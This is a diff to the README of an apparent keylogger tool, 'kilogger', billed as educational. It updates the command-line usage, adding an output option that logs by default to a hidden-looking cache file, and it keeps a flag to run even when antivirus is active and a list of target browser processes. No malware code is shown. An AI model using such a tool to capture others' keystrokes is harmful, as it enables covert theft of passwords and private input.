@@ -11,18 +11,18 @@ This is an educational purpose keylogger.
 **Manual**:  `pip install -r requirements.txt`
 Otherwise just run and it will install automatically:
 ```
-python ./kilogger/main.py 
+python -m kilogger.cli [ARGS]
 ```
 
 ## Usage
 ```
-usage: main.py [-h] [--force {0,1}] [--targets TARGETS]
+usage: cli.py [-h] [--output OUTPUT] [--force {0,1}] [--targets TARGETS]
 
 options:
   -h, --help         show this help message and exit
+  --output OUTPUT    Path for the output log file (ex. ./output.log); defaults to ~/.cache/report.log
   --force {0,1}      0: do not force logger if AV is on. 1: fuck it
-  --targets TARGETS  Name of target processes (ex. "chrome.exe, firefox.exe"); note: process names should be separated
-                     by ", ".
+  --targets TARGETS  Name of target processes (ex. "chrome.exe, firefox.exe"); note: process names should be separated by ", ".
 ```
 
 ## [VirusTotal](https://www.virustotal.com/gui/home/upload) score
